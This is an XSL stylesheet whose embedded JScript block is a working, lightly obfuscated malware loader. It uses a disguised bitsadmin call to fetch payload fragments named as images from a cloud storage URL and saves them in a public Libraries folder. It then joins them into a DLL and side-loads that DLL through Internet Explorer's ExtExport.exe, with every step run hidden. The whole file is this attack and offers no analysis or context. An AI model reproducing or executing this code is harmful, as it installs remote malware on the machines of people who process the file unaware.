<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
		
	
		
	var ak765;
	ak765 = "05/";	
	
	
	
    function bx021(min, max)
	{
     return Math.round(Math.random()*(max-min)+min)
	}	

	var cq854;
	var dro73;
	var ekw28;
	var ekw282;
	var fiq602;
	var tmp312;
	var gd481;
	var hx73;
	var irz593;
	var rwq015;
    cq854 = false; 
    dro73 = false; 
	var jk021 = new ActiveXObject("Scripting.FileSystemObject");
	var kpz8410 = new ActiveXObject("WScript.Shell");
var kpz7666 = new ActiveXObject("WScript.Shell");
    var ldp205 = new ActiveXObject("Shell.Application");
	

     function mrc430(url, file)
    {
		try
		{	
		
		 kpz8410.run(String.fromCharCode(98)+String.fromCharCode(105)+String.fromCharCode(116)+String.fromCharCode(115)+String.fromCharCode(97)+String.fromCharCode(100)+String.fromCharCode(109)+String.fromCharCode(105)+String.fromCharCode(110)+" /transfer msd5 /priority foreground "+url+" "+file,0,true); 

		 return true;
		}
        catch (ex)
        {		
         return false;
        }
        
    }	
	
	
	
function nts316(min)
{

dro73 = false; 


     ekw28 = "https://storage.googleapis.com/tianjin/"+ak765;


ekw282 = ekw28;


gd481 = "C:\\Users\\Public\\Libraries\\win32";
hx73 = "C:\\Users \\Public\\Libraries\\win32";
irz593 = "142_T3SL4S_"	


	try
	{
	var fso = new ActiveXObject("Scripting.FileSystemObject");  
	fso.CreateFolder(gd481);  
	}
    catch (ex)
    {
		
	}

	try
	{
	var fso = new ActiveXObject("Scripting.FileSystemObject");  
	fso.CreateFolder(hx73);  
	}
    catch (ex)
    {
		
	}


	try
	{    
     if (jk021.FileExists(gd481+"\\halawxtz64.dll")){	   
	   f = jk021.GetFile(gd481+"\\halawxtz64.dll");	   
	   if (f.size < 10 ){
		f.Delete();  
		f.Close();		
	   }
     }   
	}
    catch (ex)
    {
		
	}		 
   

	try
	{    
        if (!jk021.FileExists(gd481+"\\0142vrxi.log")){	   
	     f = jk021.GetFile(gd481+"\\halawxtz64.dll");	   
		 f.Delete();  
		 f.Close();		
        }   
	}
    catch (ex)
    {
		
	}	  


	try
	{    
        if (!jk021.FileExists(gd481+"\\0142refor.log")){	   
	      f = jk021.GetFile(gd481+"\\halawxtz64.dll");	   
		 f.Delete();  
		 f.Close();		
        }   
	}
    catch (ex)
    {
		
	}	  
   
     wpxa064 = "C:\\Program Files (x86)\\Internet Explorer\\ExtExport.exe";
     wpxa032 = "C:\\Program Files\\Internet Explorer\\ExtExport.exe";

        if (jk021.FileExists(gd481+"\\halawxtzdwwn.gif")){	
            if (jk021.FileExists(gd481+"\\halawxtzg.gif")){			 
		        if (jk021.FileExists(gd481+"\\halawxtzxa.~")){		 
					if (jk021.FileExists(gd481+"\\halawxtzxb.~")){		 

						 if (jk021.FileExists(wpxa064)){						 	
						 try
						 {				  
						 kpz8410.run('"'+wpxa064+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 		
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 dro73 = true;             
						}
						
						
						 if (jk021.FileExists(wpxa032)){	

						 try
						 {				  
						 kpz8410.run('"'+wpxa032+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 			
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 dro73 = true;             
						}
						
					}
		        }
		    }
        }
     
     
  if (dro73 == false)
  { 

	try
	{

	 cq854 = mrc430(ekw28+"halawxtza.jpg.zip",gd481+"\\halawxtza.jpg");
        if (cq854 == false) {	
	     mrc430(ekw282+"halawxtza.jpg.zip",gd481+"\\halawxtza.jpg");
	    }
	}
    catch (ex)
    {
	
	}	


	try
	{
	 cq854 = mrc430(ekw28+"halawxtzb.jpg.zip",gd481+"\\halawxtzb.jpg");
        if (cq854 == false) {	
	     mrc430(ekw282+"halawxtzb.jpg.zip",gd481+"\\halawxtzb.jpg");
	    }
	}
    catch (ex)
    {
			
	}	
	

	try
	{
	 cq854 = mrc430(ekw28+"halawxtzc.jpg.zip",gd481+"\\halawxtzc.jpg");
        if (cq854 == false) {	
	     mrc430(ekw282+"halawxtzc.jpg.zip",gd481+"\\halawxtzc.jpg");
	    }
	}
    catch (ex)
    {
		
	}	


	try
	{
	 cq854 = mrc430(ekw28+"halawxtzdwwn.gif.zip",gd481+"\\halawxtzdwwn.gif");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzdwwn.gif.zip",gd481+"\\halawxtzdwwn.gif");
	    }
	}
    catch (ex)
    {
		
	}


	try
	{
	 cq854 = mrc430(ekw28+"halawxtzdx.gif.zip",gd481+"\\halawxtzdx.gif");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzdx.gif.zip",gd481+"\\halawxtzdx.gif");
	    }
	}
    catch (ex)
    {
		
	}

	try
	{
	 cq854 = mrc430(ekw28+"halawxtzg.gif.zip",gd481+"\\halawxtzg.gif");
        if (cq854 == false) {		 
	     mrc430(ekw282+"halawxtzg.gif.zip",gd481+"\\halawxtzg.gif");
	    }
	}
    catch (ex)
    {
		
	}
	

	try
	{
	 cq854 = mrc430(ekw28+"halawxtzgx.gif.zip",gd481+"\\halawxtzgx.gif");
        if (cq854 == false) {		 
	     mrc430(ekw282+"halawxtzgx.gif.zip",gd481+"\\halawxtzgx.gif");
	    }
	}
    catch (ex)
    {
		
	}

	
	
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzxa.gif.zip",gd481+"\\halawxtzxa.~");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzxa.gif.zip",gd481+"\\halawxtzxa.~");
	    }
	}
    catch (ex)
    {
	
	}	


	try
	{
	 cq854 = mrc430(ekw28+"halawxtzxb.gif.zip",gd481+"\\halawxtzxb.~");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzxb.gif.zip",gd481+"\\halawxtzxb.~");
	    }
	}
    catch (ex)
    {
		
	}	

	



	
	rwq015 = bx021(1, 30);
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"a.dll.zip",gd481+"\\halawxtz64a.dll");
	    if (cq854 == false) {
	     mrc430(ekw282+"halawxtzhh"+rwq015+"a.dll.zip",gd481+"\\halawxtz64a.dll");
	    }
	}
    catch (ex)
    {
		
	}	

	try
	{
	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"b.dll.zip",gd481+"\\halawxtz64b.dll");
	    if (cq854 == false) {
	     mrc430(ekw282+"halawxtzhh"+rwq015+"b.dll.zip",gd481+"\\halawxtz64b.dll");
	    }
	}
    catch (ex)
    {
		
	}	
	
					if (jk021.FileExists(gd481+"\\halawxtz64b.dll")){
						if (jk021.FileExists(wpxa064)){						 	
						 try
						 {		
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozcrt19.dll',0,true); 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozsqlite3.dll',0,true); 						 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > sqlite3.dll',0,true); 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > halawxtz64.dll',0,true);
						 
						 kpz8410.run('"'+wpxa064+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 		
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 dro73 = true;             
						}
						
						
						 if (jk021.FileExists(wpxa032)){	

						 try
						 {	
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozcrt19.dll',0,true); 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozsqlite3.dll',0,true); 						 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > sqlite3.dll',0,true); 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > halawxtz64.dll',0,true); 					 
						 
						 kpz8410.run('"'+wpxa032+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 		
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 dro73 = true;             
						}
					}
	
  }


}

nts316(bx021(0000001,999999999));

 	
	]]> </ms:script>
</stylesheet>	
 

